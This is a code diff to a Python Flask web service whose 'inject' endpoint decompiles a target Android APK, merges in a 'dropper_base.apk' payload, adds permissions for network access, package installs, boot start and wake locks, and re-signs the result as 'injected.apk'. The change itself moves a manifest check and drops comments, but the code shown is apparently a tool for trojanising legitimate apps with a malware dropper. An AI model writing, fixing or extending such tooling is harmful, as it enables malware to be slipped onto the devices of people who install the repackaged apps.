@@ -12,7 +12,6 @@ WORK = tempfile.mkdtemp()
 KEYSTORE = "keystore.jks"
 DROPPER = "dropper_base.apk"
 
-# Agar 500 error aaye toh HTML ki jagah JSON me error bheje
 @app.errorhandler(500)
 def internal_error(exception):
     return jsonify({"error": f"Internal Server Error: {str(exception)}"}), 500
@@ -50,6 +49,11 @@ def inject():
         if res.returncode != 0:
             return jsonify({"error": f"Apktool target fail: {res.stderr[:200]}"}), 500
 
+        # Check karo ki manifest file hai ya folder
+        manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
+        if os.path.isdir(manifest_path):
+            return jsonify({"error": "Target APK ka structure kharab hai. AndroidManifest.xml ek folder ban gaya hai."}), 500
+
         # Dropper decompile
         dropper_dir = os.path.join(WORK, "dropper_dir")
         shutil.rmtree(dropper_dir, ignore_errors=True)
@@ -64,7 +68,6 @@ def inject():
             shutil.copytree(src, dst, dirs_exist_ok=True)
 
         # Manifest merge
-        manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
         with open(manifest_path) as f:
             t = f.read()
         perms = ["android.permission.INTERNET","android.permission.REQUEST_INSTALL_PACKAGES","android.permission.RECEIVE_BOOT_COMPLETED","android.permission.WAKE_LOCK"]
@@ -92,7 +95,6 @@ def inject():
         return send_file(signed, as_attachment=True, download_name="injected.apk")
 
     except Exception as e:
-        # Traceback print karega taaki log me exact line dikhe
         traceback.print_exc()
         return jsonify({"error": f"Python Error: {str(e)}"}), 500
 
